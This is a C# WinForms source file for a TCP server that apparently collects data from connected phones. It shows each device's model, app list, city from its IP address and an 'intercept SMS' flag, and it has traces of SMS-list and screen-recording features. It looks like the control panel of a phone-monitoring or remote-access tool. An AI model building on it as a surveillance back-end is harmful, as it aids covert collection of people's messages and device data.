﻿using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ClientCtrl
{
    public partial class FormMain : Form
    {
        public FormMain()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Control.CheckForIllegalCrossThreadCalls = false;
            initSocket();
            addData();
        }
        public const int IP_PORT = 6666;
        private void initSocket()
        {
            this.textBox_host.Text = getIpAddress() + ":" + IP_PORT;



            Socket server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint point = new IPEndPoint(IPAddress.Any, IP_PORT);
            server.Bind(point);
            server.Listen(999);
            // Thread thread = new Thread(acceptClient);
            //thread.IsBackground = true;
            // thread.Start(server);

            DoSocketAccept msg = new DoSocketAccept(acceptClient);
            msg.BeginInvoke(server, null, null);

            listBox_log.Items.Add("=====init======");

        }


        private void acceptClient(Object obj)
        {
            Socket serverSocket = obj as Socket;
            while (true)
            {
                Socket client = serverSocket.Accept();
                var sendIpoint = client.RemoteEndPoint.ToString();
                listBox_log.Items.Add("Accept======" + sendIpoint);
                Console.WriteLine($"{sendIpoint}Connection");
                //开启一个新线程不停接收消息
                //Thread thread = new Thread(ReciveContent);
                //thread.IsBackground = true;
                // thread.Start(client);

                DoReadMsg msg = new DoReadMsg(ReciveContent);
                msg.BeginInvoke(client, null, null);
            }

        }
        private void Test(Object obj)
        {
            Socket socketServer = obj as Socket;
            byte[] headerByte = new byte[150];
            while (true)
            {
                listBox_log.Items.Add("11111:");
                Thread.Sleep(1000);
            }
        }


        //委托
        private delegate void DoSocketAccept(Socket client);

        private delegate void DoReadMsg(Socket client);


        //接受客户端消息
        private void ReciveContent(Object obj)
        {
            int length = 0;
            while (true)
            {
                Console.WriteLine("ReciveContent:");

                Socket socketServer = obj as Socket;

                if (length == 0)
                {
                    byte[] headerByte = new byte[15];
                    socketServer.Receive(headerByte);
                    String header = System.Text.UTF8Encoding.Default.GetString(headerByte);
                    Console.WriteLine("client:===header:" + header);
                    listBox_log.Items.Add("client:===header:" + header);
                    try
                    {
                        length = int.Parse(header);

                    }
                    catch (Exception e)
                    {

                    }
                    continue;
                }
                byte[] buffer = new byte[length];
                int len = socketServer.Receive(buffer);

                StringBuilder sb = new StringBuilder();
                sb.Append(UTF8Encoding.UTF8.GetChars(buffer, 0, len));
                int end = 0;

                while ((end = length - len) > 0)
                {
                    length = end;
                    byte[] endBuffer = new byte[end];
                    len = socketServer.Receive(buffer);
                    sb.Append(UTF8Encoding.UTF8.GetChars(buffer, 0, len));
                    Console.WriteLine("读取了多长的数据？：" + len);


                }
                Console.WriteLine("body：" + sb.ToString());



                if (sb.Length == 0)
                {
                    Console.WriteLine("body是空的啊");
                    continue;
                }
                length = 0;

                //添加数据
                ClientInfoBean clientInfo = AllUtils.jsonToObj(sb.ToString(), typeof(ClientInfoBean)) as ClientInfoBean;
                if (clientInfo == null)
                {
                    Console.WriteLine("数据格式有问题==========");
                    return;
                }
                //upData
                addDataList(clientInfo, socketServer);
               
                    UIAppList.updataAppsData(this.dataGridView_apps, clientInfo.appList);

                 IPEndPoint clientipe = (IPEndPoint)socketServer.RemoteEndPoint;
                //clientInfo.ipAddress = clientipe.Address.ToString();
                 UIAppList.updataPhoneInfo(this.listBox_phone_info, clientInfo);
                // UIAppList.updataSmsList(this.dataGridView_sms, clientInfo.smsList);

            }



        }



        private string getIpAddress()
        {
            IPHostEntry ipHost = Dns.Resolve(Dns.GetHostName());
            IPAddress ipAddr = ipHost.AddressList[0];
            return ipAddr.ToString();
        }

        private Hashtable hashTableSocket;
        //添加一条记录到列表
        private void addDataList(ClientInfoBean clientInfo, Socket socket)
        {
            if (clientInfo == null)
            {
                return;
            }
            if (hashTableSocket == null)
            {
                hashTableSocket = new Hashtable();
            }

            if (!hashTableSocket.ContainsKey(clientInfo.deviceId))
            {
                hashTableSocket.Add(clientInfo.deviceId, socket);

                int index = this.dataGridView1.Rows.Add();
                this.dataGridView1.Rows[index].Cells[0].Value = "第" + index + "条";
                this.dataGridView1.Rows[index].Cells[1].Value = "alis";
                this.dataGridView1.Rows[index].Cells[2].Value = clientInfo.phoneModle;
                this.dataGridView1.Rows[index].Cells[3].Value = true;
                this.dataGridView1.Rows[index].Cells[4].Value = clientInfo.isInterceptSMS;
                this.dataGridView1.Rows[index].Cells[5].Value = AllUtils.getIpsCity(clientInfo.ipAddress);
            }
            //  this.dataGridView1.DataSource = hashTableSocket;

        }

        private void addData()
        {
            hashTableSocket = new Hashtable();



        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.InitialDirectory = "D:/";
            saveFileDialog.Filter = "avi视频文件(*.avi)|*.avi|mp4视频文件(*.mp4)|*.mp4";
            String time = DateTime.Now.ToString("yyyy_MM_dd");
            saveFileDialog.FileName = "屏幕录制" + time;
            saveFileDialog.FilterIndex = 2;
            saveFileDialog.RestoreDirectory = true;
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                String localFilePath = saveFileDialog.FileName.ToString();
                System.IO.FileStream fs = (System.IO.FileStream)saveFileDialog.OpenFile();//输出文件

                fs.Write(System.Text.Encoding.ASCII.GetBytes(localFilePath), 0, localFilePath.Length);
                fs.Flush();
                fs.Close();
            }
        }

        private void dataGridView1_SelectionChanged(object sender, EventArgs e)
        {
            Console.WriteLine("SelectionChanged===");
            DataGridView viewData = sender as DataGridView;



        }

        private void dataGridView1_RowEnter(object sender, DataGridViewCellEventArgs e)
        {
            Console.WriteLine("dataGridView1_RowEnter===" + e.RowIndex);
        }
    }
}
